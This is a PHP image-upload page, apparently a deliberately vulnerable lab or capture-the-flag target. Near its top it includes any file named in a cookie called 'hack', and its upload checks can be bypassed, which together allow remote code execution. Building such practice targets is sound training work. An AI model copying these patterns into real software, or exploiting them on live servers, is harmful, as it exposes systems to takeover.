<?php
include "../header.php";
include "../isAuthenticated.php";

if (isset($_COOKIE['hack']))
{
        include($_COOKIE['hack']);
}

if (isset($_POST['submit'])) {
			$upload    = false;
			$uploaddir  = "uploads/";
			$filename  = $_FILES['image']['name'];
			$filetype  = $_FILES['image']['type'];
			$file_ext  = strrchr($filename, '.');
			$imageinfo = getimagesize($_FILES['image']['tmp_name']);
			$whitelist = array(".jpg",".jpeg",".gif",".png"); 

			if (!(in_array($file_ext, $whitelist))) {
				die('Error 000');
			}

			if(strpos($filetype,'image') === false) {
				die('Error 001');
			}

			if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') {
				die('Error 002');
			}

			if(substr_count($filetype, '/') > 1){
				die('Error 003');
			}

			if($_FILES['image']['size'] > 21202){
				die('file to0 large');
			}

			$uploadfile = $uploaddir . md5(basename($_FILES['image']['name'])).$file_ext;

			if (move_uploaded_file($_FILES['image']['tmp_name'], $uploadfile)) {
				$upload = true;
			} else {
				die('cant upload');
			}
}

?>

</head>
<div class="container">
  <div class="row justify-content-center">
    <h1>UPLOAD FILE</h1>
  </div>
</div>
<body>
<div class="container h-100">
    <div class="row align-items-center h-100">
        <div class="col-6 mx-auto">
            <div class="jumbotron">
			<div class="form-group">
			<form action="" method="post" enctype="multipart/form-data">
				<p>upload file: </p>
				<input type="file" name="image" accept="image/*" class="form-control-file"/>
				<br/>
				<br/>
				<button type="submit" name="submit" class="btn btn-primary">submit</button>
				</div>
			</form>
            </div>
        </div>
    </div>
</div>

<br>
<div class="container h-100">
	<div class="row align-items-center h-100">
		<div class="col-6 mx-auto">
			<?php
			global $upload;
			if ($upload)
			{
				echo "<p>Upload berhasil:</p>";
				echo "<img src=\"".$uploadfile."\"><br />";
			}

			?>
		</div>
    </div>
</div>
	
</body>
</html>